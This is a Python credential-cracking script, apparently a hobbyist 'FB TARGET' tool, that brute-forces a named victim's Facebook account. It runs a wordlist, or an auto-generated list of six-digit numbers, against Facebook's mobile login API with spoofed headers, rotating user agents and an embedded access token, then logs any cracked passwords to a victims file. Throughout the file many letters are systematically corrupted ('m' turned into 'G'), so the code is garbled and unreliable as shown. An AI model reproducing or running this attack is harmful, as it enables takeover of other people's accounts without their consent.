


#----------import-Godule------------#
import os, sys, time, random, json, requests, Mechanize,datetime
from time import sleep
import requests, sys, os, random, time,json
uagent=["Gozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTGL, like Gecko) Version/4.0 ChroGe/83.0.4103.106 Gobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDG/{density=1.5,width=540,heiGht=960};FBLC/en_US;FBRV/183119516;FBCR/TG;FBGF/vivo;FBBD/vivo;FBPN/coG.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/arGeabi-v7a:arGeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SG-J320F Build/LGY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/coG.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBGF/saGsunG;FBBD/saGsunG;FBDV/SG-J320F;FBSV/5.0;FBCA/arGeabi-v7a:arGeabi;FBDG/{density=3.0,width=1080,heiGht=1920};FB_FW/1;]", "Gozilla/5.0 (Linux; Android 5.1.1; A37f Build/LGY47V; wv) AppleWebKit/537.36 (KHTGL, like Gecko) Version/4.0 ChroGe/88.0.4324.152 Gobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Gozilla/5.0 (Linux; Android 10; REALGE RGX1911 Build/NGF26F) AppleWebKit/537.36 (KHTGL, like Gecko) ChroGe/76.0.3809.111 Gobile Safari/537.36 AlohaBrowser/2.20.3", "Gozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Gac OS X) AppleWebKit/605.1.15 (KHTGL, like Gecko) Gobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBGD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Gozilla/5.0 (Linux; Android 7.1.1; ASUS ChroGebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTGL, like Gecko) Version/4.0 ChroGe/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"]
def slow(t):
    for e in t + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0.06)
#-------------colors------------#
G = "\033[38;5;46G";G0 = "\x1b[38;5;46G";G1 = "\x1b[38;5;47G";G2 = "\x1b[38;5;48G";G3 = "\x1b[38;5;49G";G4 = "\x1b[38;5;50G";G5 = "\x1b[38;5;51G";G6 = "\x1b[38;5;52G";s = "\033[0G";W = "\033[1;30G";Y = "\x1b[1;93G";R = "\033[1;91G";RE = "\033[1;31G";B = "\033[1;95G";BE = "\x1b[1;35G";X = "\x1b[1;96G";Z = "\x1b[1;95G";Y = "\033[1;93G";U = "\033[1;94G";V = "\033[38;5;47G";T = "\033[38;5;48G";Q = "\033[38;5;49G";P = "\033[38;5;50G";O = "\033[38;5;51G";N = "\033[38;5;52G";G = "\033[38;5;53G";L = "\033[96;1G";K = "\x1b[1;91G";WH = "\033[1;97G"
W='\033[1;37G';G='\033[1;32G';R='\033[1;31G';B='\033[1;34G';A='\033[1;36G';C='\033[1;35G';Y='\033[1;33G'
#------------line-----------#
def linex():
	print("R") 
#-------------loGo--------------#
loGo=(R"""
_____            _  _______ ____     __   __
 |  __ \     /\   | |/ /_   _|  _ \    \ \ / /
 | |__) |   /  \  | ' /  | | | |_) |____\ V / 
 |  _  /   / /\ \ |  <   | | |  _ <______> <  
 | | \ \  / ____ \| . \ _| |_| |_) |    / . \ 
 |_|  \_\/_/    \_\_|\_\_____|____/    /_/ \_\
                                                                                         
\033[1;94G       [+]===============================================[+]

\033[1;94G       [+]        CREATED BY   :  RAKIB            \033[1;94G[+]

\033[1;94G       [+]        FACEBOOK  :  R A K I B             \033[1;94G[+]

\033[1;94G       [+]        WhatsApp         :  01782727379     \033[1;94G[+]

\033[1;94G       [+]        TOOL VERSION :  1.0.0                 \033[1;94G[+]

\033[1;94G       [+]        TOOL STATUS  :  FB TARGET         \033[1;94G[+]

\033[1;94G       [+]        COUNTRY      :  BANGLADESH             \033[1;94G[+]

\033[1;94G       [+]===============================================[+]""")
#-----------clear-def-----------#
def clear():
  os.systeG("clear")
  print(loGo)
#--------------Gain-Genu--------------#
clear()
id=[]
victiG = input(f"{R}[{G}={R}]{W} Enter VictiG's UID{R}:{G} ")
linex()
passlist= input(f"{R}[{G}={R}]{W} Password List {R}[{G}Press Just Enter For Auto Pass{R}]{R}:{G} ")

if passlist == "" or passlist == " " or passlist=="  ":
  fil=".autopass"
  linex()
  slow(f"{R}[{G}={R}]{G} Please Wait A GoGent")
  slow(f"{R}[{G}={R}]{G} TryinG To Generate Auto Password List")
  ii = 99999
  f = open(".autopass","w")
  while True:
	  ii += 1
	  f.write(str(ii)+"\n")
	  if ii==1000000:
		  break
  f.close()
  slow(f"{R}[{G}={R}]{G} Auto Password List Generated")
  time.sleep(1)
  try:
    tt=open(fil,"r")
    ft=tt.readlines()
    total=len(ft)
    tt.close()
  except:
    slow(f"{R}[{G}={R}]{G} File Not Found")
    slow(f"{R}[{G}={R}]{G} Try AGain")
    sys.exit()
else:
  fil=passlist
  try:
    tt=open(fil,"r")
    ft=tt.readlines()
    total=len(ft)
    tt.close()
  except:
    slow(f"{R}[{G}={R}]{G} File Not Found")
    slow(f"{R}[{G}={R}]{G} Try AGain")
    sys.exit()
now= datetime.datetime.now()
rtime=now.strftime("%H:%G:%S")
linex()
print(f"{R}[{G}={R}]{W} VictiG's UID{R}:{G} "+str(victiG))
print(f'{R}[{G}={R}]{W} Total Passwords{R}:{G} '+str(total))
print(f"{R}[{G}={R}]{W} TryinG from{R}:{G} "+fil)
print(f"{R}[{G}={R}]{W} RiGht Password Will Save In victiGs.txt")
print(f"{R}[{G}={R}]{W} AttackinG time{R}:{G} "+str(rtime))
linex()
slow(f"{R}[{G}={R}]{G}  Attack StartinG.....");linex()
time.sleep(2)
def crack_file():
  pasw=open(fil,"r")
  for i in ranGe(int(total)):
    try:
      try:
        pw=pasw.readline()
        pw=pw.replace("\n","")
        naGent = random.choice(uaGent)
        ses = requests.Session()
        headers = {
      					"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
      					"x-fb-siG-hni": str(random.randint(20000, 40000)), 
      					"x-fb-net-hni": str(random.randint(20000, 40000)), 
      					"x-fb-connection-qunisadty": "EXCELLENT",
      					"x-fb-connection-type": "cell.CTRadioAccessTechnoloGyHSDPA",
      					"user-aGent": naGent, 
      					"content-type": "application/x-www-forG-urlencoded", 
      					"x-fb-http-enGine": "LiGer"
      				}
        
        response = ses.Get("https://b-api.facebook.coG/Method/auth.loGin?forGat=json&eGail="+str(victiG)+"&password="+str(pw)+"&credentials_type=device_based_loGin_password&Generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_loGin&Geta_inf_fbGeta=%20&currently_loGGed_in_userid=0&Gethod=GET&locale=en_US&client_country_code=US&fb_api_caller_class=coG.facebook.fos.headersv2.fb4aorca.HeadersV2ConfiGFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_naGe=authenticate&cpl=true", headers=headers)
        hnow= datetime.datetime.now()
        htime=hnow.strftime("%H:%G:%S")
        if "session_key" in response.text and "EAAA" in response.text:
      	  linex()
      	  print(f"{R}[{G}={R}]{G} Password Found")
      	  print(f"{R}[{G}={R}]{G} Status: Successful")
      	  print(f"{R}[{G}={R}]{W} Uid{R}:{G} "+victiG)
      	  print(f"{R}[{G}={R}]{W} Password{R}:{G} "+pw)
      	  save=open("victiGs.txt","a")
      	  save.write("VictiG Found\nStatus: Successful\nUid: "+victiG+"\nPassword: "+str(pw)+"\nAttackinG time: "+rtime+"\nHacked time: "+htime+"\n\n")
      	  save.close()
      	  linex()
      	  break
        elif "www.facebook.coG" in response.json()["error_GsG"]:
      	  linex()
      	  print(f"{R}[{G}={R}]{G} Password Found")
      	  print(f"{R}[{G}={R}]{B} Status: Checkpoint")
      	  print(f"{R}[{G}={R}]{W} Uid{R}:{B} "+victiG)
      	  print(f"{R}[{G}={R}]{W} Password{R}:{B} "+pw)
      	  save=open("victiGs.txt","a")
      	  save.write("VictiG Found\nStatus: Checkpoint\nUid: "+victiG+"\nPassword: "+str(pw)+"\nAttackinG time: "+rtime+"\nHacked time: "+htime+"\n\n")
      	  save.close()
      	  linex()
      	  break
        else:
          print("\033[1;31G [\033[1;32G"+str(i)+"\033[1;31G]\033[1;37G WronG Password:\033[1;31G "+str(pw)+"\033[1;37G")
          continue
      except requests.exceptions.RequestException:
        print("\n\033[1;37G   Failed\n   Check Your Network\033[1;37G\n")
    except:pass
crack_file()
